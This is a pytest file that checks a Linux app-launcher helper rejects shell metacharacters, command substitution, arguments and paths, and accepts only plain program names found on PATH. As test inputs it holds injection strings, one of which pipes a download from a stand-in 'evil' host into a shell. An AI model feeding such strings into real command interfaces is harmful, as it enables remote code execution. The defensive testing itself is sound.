# Copyright (c) 2026 Shane Smith / Sassy Consulting LLC. All rights reserved.
# Proprietary source. This notice is Copyright Management Information (17 U.S.C. 1202); removal or alteration prohibited.
# CodeMark: SCLLC1-SassyMCP-LAUNCHARGX01
"""Linux sassy_launch_app must never interpolate name into a shell string."""
from sassymcp.modules.app_launcher import _linux_launch_argv


def test_rejects_shell_metacharacters():
    argv, err = _linux_launch_argv("x; curl evil|sh")
    assert argv is None
    assert err


def test_rejects_command_substitution():
    argv, err = _linux_launch_argv("$(id)")
    assert argv is None
    assert "characters" in err


def test_rejects_arguments():
    argv, err = _linux_launch_argv("ls -la")
    assert argv is None
    assert "single PATH command" in err


def test_rejects_path():
    argv, err = _linux_launch_argv("/bin/sh")
    assert argv is None
    assert "filesystem path" in err


def test_accepts_simple_name(monkeypatch):
    monkeypatch.setattr(
        "sassymcp.modules.app_launcher.shutil.which",
        lambda n: f"/usr/bin/{n}" if n == "xterm" else None,
    )
    argv, err = _linux_launch_argv("xterm")
    assert err is None
    assert argv == ["/usr/bin/xterm"]


def test_missing_on_path(monkeypatch):
    monkeypatch.setattr("sassymcp.modules.app_launcher.shutil.which", lambda n: None)
    argv, err = _linux_launch_argv("definitely-not-an-app")
    assert argv is None
    assert "not found on PATH" in err
